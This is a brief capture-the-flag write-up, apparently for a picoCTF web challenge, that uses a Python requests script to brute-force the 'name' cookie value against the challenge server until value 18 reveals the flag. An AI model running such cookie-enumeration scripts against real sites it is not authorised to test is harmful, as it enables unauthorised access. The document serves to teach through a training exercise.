After inspecting the cookies under "Application" in the dev-tools menu [link](http://mercury.picoctf.net:6418/)
we can see that the response of the web page will be determined by the value given to the `name` cookie.

With the following script we can loop over a number of possible values.

``` py
import requests

url = "http://mercury.picoctf.net:6418/check"

payload = ""

for i in range(0,30):
    headers = {
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        'Accept-Language': "en-US;q=0.5",
        'Cache-Control': "no-cache",
        'Connection': "keep-alive",
        'Cookie': "name=" + str(i),
        'Pragma': "no-cache",
        'Referer': "http://mercury.picoctf.net:6418/",
        'Sec-GPC': "1",
        'Upgrade-Insecure-Requests': "1",
        'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36"
        }

    response = requests.request("GET", url, data=payload, headers=headers)

    r = response.text

    if "That is a cookie! Not very special though..." in r:
        print(f"{i}: yes")
    else:
        print(f"{i}: no")

```

The script quickly checks if the same message appears in all responses. We can quickly see that the request where the cookie has a value of `18` doesn't include it. This was the correct cookie and the flag is revealed.
